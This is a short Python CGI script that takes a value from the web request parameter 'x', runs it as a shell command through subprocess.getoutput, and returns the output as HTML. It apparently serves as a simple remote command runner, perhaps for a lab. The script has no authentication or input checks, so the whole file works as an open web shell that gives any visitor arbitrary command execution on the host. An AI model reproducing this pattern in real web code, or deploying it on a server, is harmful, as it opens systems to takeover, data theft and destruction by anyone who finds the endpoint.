#!/usr/bin/python3

print("content-type:text/html")
print()

import cgi
import subprocess as sp
x=cgi.FieldStorage()
op=x.getvalue('x')
output=sp.getoutput(op)
print("<pre> <b><h3>"+output+"</h3></b></pre>")

